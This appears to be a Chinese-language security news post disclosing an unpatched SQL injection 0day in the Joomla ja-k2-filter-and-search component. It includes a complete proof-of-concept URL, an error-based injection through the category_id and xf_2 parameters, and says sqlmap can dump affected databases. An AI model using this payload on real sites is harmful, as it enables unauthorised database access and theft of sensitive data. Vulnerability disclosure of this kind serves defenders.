# Joomla 平台 ja-k2 filter and search 组件——SQL注入0day！

信息安全专家在Joomla组件ja-k2-filter-and-search中发现了一个SQL注入0day。

  

信息安全研究人员Dimitrios Roussis和Evangelos apostoloudis，发现Joomla的ja-k2-filter-and-search组件中含一个SQL注入漏洞

（https://www.joomlart.com/joomla/extensions/ja-k2-search）。

  

Joomla是一个流行的开源内容管理系统（CMS）。属于Portal(企业入口网站)类型，较适合作为商业类型的网站建站。Joomla是用PHP语言和MySQL数据库开发的软件系统，可以在Linux、Windows、MacOSX等多个平台运行。

  

该组件已被用于各种Joomla网站。通过使用sqlmap工具，恶意用户能够访问到网站的数据库。在某些情况下会揭示非常关键或敏感的数据。

  

此漏洞还没有被发现或在任何国际网站上公布。此外，组件开发人员还没有被告知这个关键问题，这意味着此知名数据库尚未更新。因此，这个漏洞是一个0day漏洞。

  

**概念证明**

利用以下请求，可以检查任何使用该特定组件的Joomla网站：

**(WhateverSite)**/index.php?category\_id=(select%201%20and%20row(1%2c1)%3E(select%20count(\*)%2cconcat(concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(117)%2cCHAR(82)%2cCHAR(57)%2cCHAR(71)%2cCHAR(65)%2cCHAR(77)%2cCHAR(98)%2cCHAR(77))%2cfloor(rand()\*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201))&Itemid=135&option=com\_jak2filter&searchword=the&view=itemlist&xf\_2=5%27

  

若漏洞存在，检查结果会呈现如下：

  

![](../Images/dc1d36c1850f37a53cdd605f755f3a7f.png "Joomla 平台 ja-k2 filter and search 组件——SQL注入0day！")

 

通过利用sqlmap和给定的URL，很明显，转储的数据库可以实现。
